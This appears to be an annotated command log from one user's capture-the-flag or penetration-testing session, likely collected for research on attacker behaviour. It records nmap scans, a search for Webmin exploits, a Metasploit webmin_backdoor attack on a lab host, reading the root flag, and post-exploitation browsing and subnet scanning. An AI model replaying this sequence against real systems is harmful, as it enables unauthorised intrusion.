User 56 start time 1594797664 end 1594805186
PADDING
PADDING
PADDING
INPUT|56--0|A0 A1 |1594797664|56|nmap 172.18.1.15|OUTPUT
INPUT|56--1|A0 A1 |1594797688|56|nmap -Pn 172.18.1.15|OUTPUT
INPUT|56--2|A0 A1 |1594797776|56|nmap -Pn -p- 172.18.1.15|OUTPUT
INPUT|56--3|A10 |1594797902|56|ls|OUTPUT
INPUT|56--4|M0 |1594797925|56|nmap 172.18.1.5|OUTPUT
INPUT|56--5|A1 |1594797968|56|nmap -sC 172.18.1.5|OUTPUT
INPUT|56--6|M1 |1594797991|56|nmap -sV 172.18.1.5|OUTPUT
INPUT|56--7|U|1594798024|56|nmap -sC -sV -p 10000 172.18.1.5|OUTPUT
INPUT|56--8|M2 |1594798203|56|msfconsole|OUTPUT
INPUT|56--9|A3 |1594798240|56|search miniserv|OUTPUT
INPUT|56--10|A3 |1594798289|56|search Miniserv|OUTPUT
INPUT|56--11|A3 |1594798296|56|search 1.920|OUTPUT
INPUT|56--12|M3 |1594798375|56|search webmin|OUTPUT
INPUT|56--13|U|1594798412|56|searchsploit webmin|OUTPUT
INPUT|56--14|M8 |1594798448|56|searchsploit -m exploits/linux/remote/47230.rb|OUTPUT
INPUT|56--15|U|1594798463|56|nano /usr/share/exploitdb/exploits/linux/remote/47230.rb|OUTPUT
INPUT|56--16|A15 |1594798487|56|chmod +x /usr/share/exploitdb/exploits/linux/remote/47230.rb|OUTPUT
INPUT|56--17|U|1594798500|56|cd /usr/share/exploitdb/exploits/linux/remote/|OUTPUT
INPUT|56--18|A10 |1594798501|56|ls|OUTPUT
INPUT|56--19|U|1594798523|56|./47230.rb|OUTPUT
INPUT|56--20|A4 |1594798576|56|use /usr/share/exploitdb/exploits/linux/remote/47230.rb|OUTPUT
INPUT|56--21|U|1594798653|56|search 1.920|OUTPUT
INPUT|56--22|U|1594798737|56|ruby 47230.rb|OUTPUT
INPUT|56--23|U|1594798806|56|./47230.rb|OUTPUT
INPUT|56--24|U|1594798819|56|nano 47230.rb|OUTPUT
INPUT|56--25|M4 |1594798923|56|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|56--26|M5 |1594798927|56|show options|OUTPUT
INPUT|56--27|M6 |1594798968|56|set LHOST=10.1.135.83|OUTPUT
INPUT|56--28|U|1594798986|56|show options |OUTPUT
INPUT|56--29|U|1594799018|56|set LHOST=10.1.153.83|OUTPUT
INPUT|56--30|U|1594799026|56|set LHOST 10.1.153.83|OUTPUT
INPUT|56--31|U|1594799035|56|exploit|OUTPUT
INPUT|56--32|U|1594799042|56|show options|OUTPUT
INPUT|56--33|U|1594799064|56|set RHOSTS 172.18.1.5|OUTPUT
INPUT|56--34|U|1594799073|56|exploit|OUTPUT
INPUT|56--35|U|1594799082|56|set RPORT 10000|OUTPUT
INPUT|56--36|U|1594799094|56|exploit |OUTPUT
INPUT|56--37|U|1594799098|56|show options |OUTPUT
INPUT|56--38|U|1594799143|56|set LHOST 192.168.129.103|OUTPUT
INPUT|56--39|U|1594799209|56|exploit |OUTPUT
INPUT|56--40|A9 A11 A12 A17 |1594799313|56|cat /root/flag|OUTPUT
INPUT|56--41|A10 |1594799321|56|cd /root/ | ls -la|OUTPUT
INPUT|56--42|A9 A11 A12 A17 |1594799417|56|cat config|OUTPUT
INPUT|56--43|A9 A11 A12 A17 |1594799426|56|cat webmin.schema|OUTPUT
INPUT|56--44|A9 A11 A12 A17 |1594799524|56|cat help|OUTPUT
INPUT|56--45|A10 |1594799527|56|ls|OUTPUT
INPUT|56--46|A9 A11 A12 A17 |1594799550|56|cat module.info.cz|OUTPUT
INPUT|56--47|A9 A11 A12 A17 |1594799563|56|cat schema.cgi|OUTPUT
INPUT|56--48|A9 A11 A12 A17 |1594799693|56|cat config|OUTPUT
INPUT|56--49|A10 |1594799706|56|ls|OUTPUT
INPUT|56--50|A9 A11 A12 A17 |1594799731|56|cat webmin.schema|OUTPUT
INPUT|56--51|A10 |1594799749|56|ls|OUTPUT
INPUT|56--52|A9 A11 A12 A17 |1594799770|56|cat schema.cgi|OUTPUT
INPUT|56--53|A9 A11 A12 A17 |1594799800|56|cat backup_config.pl|OUTPUT
INPUT|56--54|A10 |1594799814|56|ls -la|OUTPUT
INPUT|56--55|A9 A11 A12 A17 |1594799854|56|cat config.info.hr|OUTPUT
INPUT|56--56|A10 |1594799871|56|ls|OUTPUT
INPUT|56--57|A10 |1594800062|56|find /root/*[0-9][0-9][0-9][0-0][0-9]|OUTPUT
INPUT|56--58|A10 |1594800082|56|find /root/*[0-9][0-9][0-9][0-0][0-9]*|OUTPUT
INPUT|56--59|U|1594800225|56|grep -rnw /root/|OUTPUT
INPUT|56--60|U|1594800284|56|wget http://raw.githubusercontent.com/petrmarinec/awdawd/master/FILE|OUTPUT
INPUT|56--61|A10 |1594800286|56|ls|OUTPUT
INPUT|56--62|A9 A11 A12 A17 |1594800292|56|cat FILE|OUTPUT
INPUT|56--63|U|1594800360|56|grep -rnw /root/ -e '[0-9]+([^0-9]+[0-9]+){4}'|OUTPUT
INPUT|56--64|A10 |1594800436|56|ls|OUTPUT
INPUT|56--65|U|1594800463|56|y|OUTPUT
INPUT|56--66|U|1594800468|56|cd /root/|OUTPUT
INPUT|56--67|A10 |1594800469|56|ls|OUTPUT
INPUT|56--68|M9 |1594800480|56|cat WARNING-READ-ME.txt|OUTPUT
INPUT|56--69|U|1594800537|56|ifconfig|OUTPUT
INPUT|56--70|U|1594800565|56|nmap 172.18.1.5/24|OUTPUT
INPUT|56--71|U|1594800814|56|ps aux|OUTPUT
INPUT|56--72|U|1594800848|56|ifconfig|OUTPUT
INPUT|56--73|U|1594800809|56|nmap 172.18.1.5|OUTPUT
INPUT|56--74|U|1594800828|56|nmap 172.18.1.5/24|OUTPUT
INPUT|56--75|U|1594800935|56|nmap 172.18.1.1|OUTPUT
INPUT|56--76|U|1594800942|56|nmap 172.18.1.1/24|OUTPUT
INPUT|56--77|U|1594801014|56|nmap 172.18.1.5|OUTPUT
INPUT|56--78|A10 |1594801237|56|ls|OUTPUT
INPUT|56--79|A11 A12 A17 |1594801243|56|cat WARNIN-READ-ME.txt|OUTPUT
INPUT|56--80|A11 A12 A17 |1594801253|56|cat WARNING-READ-ME.txt|OUTPUT
INPUT|56--81|A10 |1594801277|56|ls|OUTPUT
INPUT|56--82|U|1594801344|56|cd /root/|OUTPUT
INPUT|56--83|A10 |1594801354|56|ls|OUTPUT
INPUT|56--84|A11 A12 A17 |1594801367|56|cat WARNING-READ-ME.txt|OUTPUT
INPUT|56--85|A10 |1594801397|56|ls|OUTPUT
INPUT|56--86|U|1594801404|56|ifconfig|OUTPUT
INPUT|56--87|U|1594801690|56|fping -ag 172.18.1.5/24|OUTPUT
INPUT|56--88|U|1594801702|56|apt get-install nmap|OUTPUT
INPUT|56--89|U|1594801654|56|nmap|OUTPUT
INPUT|56--90|A10 |1594801781|56|ls|OUTPUT
INPUT|56--91|U|1594801787|56|cd /var|OUTPUT
INPUT|56--92|A10 |1594801788|56|ls|OUTPUT
INPUT|56--93|U|1594801796|56|cd webmin|OUTPUT
INPUT|56--94|A10 |1594801797|56|ls|OUTPUT
INPUT|56--95|A11 A12 A17 |1594801804|56|cat miniserv.log|OUTPUT
INPUT|56--96|U|1594801811|56|clear|OUTPUT
INPUT|56--97|U|1594801821|56|export TERM=xterm|OUTPUT
INPUT|56--98|U|1594801823|56|clear|OUTPUT
INPUT|56--99|U|1594801824|56|l|OUTPUT
INPUT|56--100|A10 |1594801831|56|ls|OUTPUT
INPUT|56--101|U|1594801837|56|cd ..|OUTPUT
INPUT|56--102|A10 |1594801839|56|ls|OUTPUT
INPUT|56--103|U|1594801846|56|cd backups|OUTPUT
INPUT|56--104|A10 |1594801847|56|ls|OUTPUT
INPUT|56--105|U|1594801854|56|cd /home|OUTPUT
INPUT|56--106|A10 |1594801854|56|ls|OUTPUT
INPUT|56--107|U|1594801858|56|cd alice|OUTPUT
INPUT|56--108|A10 |1594801859|56|ls|OUTPUT
INPUT|56--109|A10 |1594801917|56|ls -la|OUTPUT
INPUT|56--110|A11 A12 A17 |1594801925|56|cat .bashrc|OUTPUT
INPUT|56--111|U|1594801940|56|cd ..|OUTPUT
INPUT|56--112|A10 |1594801959|56|ls|OUTPUT
INPUT|56--113|U|1594801962|56|cd bob|OUTPUT
INPUT|56--114|A10 |1594801963|56|ls|OUTPUT
INPUT|56--115|U|1594801966|56|cd ..|OUTPUT
INPUT|56--116|U|1594801969|56|cd debian|OUTPUT
INPUT|56--117|A10 |1594801971|56|ls|OUTPUT
INPUT|56--118|U|1594801974|56|cd ..|OUTPUT
INPUT|56--119|U|1594801976|56|cd eve|OUTPUT
INPUT|56--120|A10 |1594801977|56|ls|OUTPUT
INPUT|56--121|U|1594801984|56|cd ..|OUTPUT
INPUT|56--122|U|1594801985|56|cd bob|OUTPUT
INPUT|56--123|U|1594802049|56|cd /var|OUTPUT
INPUT|56--124|A10 |1594802054|56|ls|OUTPUT
INPUT|56--125|U|1594802061|56|cd local|OUTPUT
INPUT|56--126|A10 |1594802062|56|ls|OUTPUT
INPUT|56--127|U|1594802064|56|cd ..|OUTPUT
INPUT|56--128|U|1594802075|56|cd webmin|OUTPUT
